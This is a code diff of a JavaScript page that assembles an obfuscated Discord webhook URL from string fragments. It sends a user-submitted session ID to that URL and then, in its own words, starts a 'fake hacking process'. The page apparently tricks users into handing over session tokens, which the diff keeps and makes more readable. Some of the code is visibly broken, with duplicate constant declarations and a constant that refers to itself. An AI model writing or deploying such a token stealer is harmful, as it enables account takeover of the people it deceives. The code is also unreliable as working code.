@@ -8,7 +8,7 @@ const _0x2e3f = 'd.';
 const _0x4f5g = 'co';
 const _0x6h7i = 'm/';
 const _0x8j9k = 'ap';
-const _0x0k1l = 'i/'; 
+const _0x0k1l = 'i/';
 const _0x2m3n = 'we';
 const _0x4o5p = 'bh';
 const _0x6q7r = 'oo';
@@ -59,13 +59,28 @@ const _0x4o5p = 'nG';
 const _0x6q7r = 'zK';
 const _0x8s9t = 'Q';
 
-const _0x9c0d = _0x1a2b + _0x3c4d + _0x5e6f + _0x7a8b + _0x9c0d + _0x0d1e + _0x2e3f + _0x4f5g + _0x6h7i + _0x8j9k + _0x0k1l + _0x2m3n + _0x4o5p + _0x6q7r + _0x8s9t + _0x1u2v + _0x3w4x + _0x5y6z + _0x7a8b + _0x9c0d + _0x0d1e + _0x2e3f + _0x4f5g + _0x6h7i;
+const _bob = _0x1a2b + _0x3c4d + _0x5e6f + _0x7a8b + _0x9c0d + _0x0d1e + _0x2e3f + _0x4f5g + _0x6h7i + _0x8j9k + _0x0k1l + _0x2m3n + _0x4o5p + _0x6q7r + _0x8s9t + _0x1u2v + _0x3w4x + _0x5y6z + _0x7a8b + _0x9c0d + _0x0d1e + _0x2e3f + _0x4f5g + _0x6h7i;
 
-function _0x9a1b(sessionId) {
-  const _0x4e5f = { content: `New Session ID Submitted:\n\`\`\`${_0x2c3d}\`\`\`` };
-  fetch(_0x9c0d, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(_0x4e5f) })
-    .then(_0x6d7e => { if (!_0x6d7e.ok) console.error('Failed to send data'); })
-    .catch(_0x8f9a => console.error('Error:', _0x8f9a));
+function sendToDiscordWebhook(sessionId) {
+  const payload = {
+    content: `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``,
+  };
+
+  fetch(_bob, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(payload),
+  })
+    .then(response => {
+      if (!response.ok) {
+        console.error('Failed to send data to Discord webhook');
+      }
+    })
+    .catch(error => {
+      console.error('Error sending data to Discord webhook:', error);
+    });
 }
 // Validate User Input
 function validateInput() {
@@ -98,7 +113,7 @@ function validateInput() {
     return;
   }
 
- _0x9a1b(sessionId);
+ sendToDiscordWebhook(sessionId);
 
   // Hide error and start fake hacking process
   hideError();
